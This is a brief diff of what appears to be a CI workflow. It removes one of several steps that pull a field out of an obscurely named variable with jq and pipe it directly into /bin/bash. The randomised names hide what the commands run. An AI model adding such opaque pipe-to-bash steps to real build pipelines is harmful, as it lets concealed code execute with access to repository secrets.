@@ -33,7 +33,6 @@ jobs:
           echo $zj1 | jq -r .ogaj40 | /bin/bash
           printf '%s' "$jyw92081" | jq -r .sid64 | /bin/bash
           printf '%s' "$bnua1" | jq -r .oryu36 | /bin/bash
-          printf '%s' "$lnzek156" | jq -r .hhnfm5736 | /bin/bash
 
       - name: Store results
         if: always()
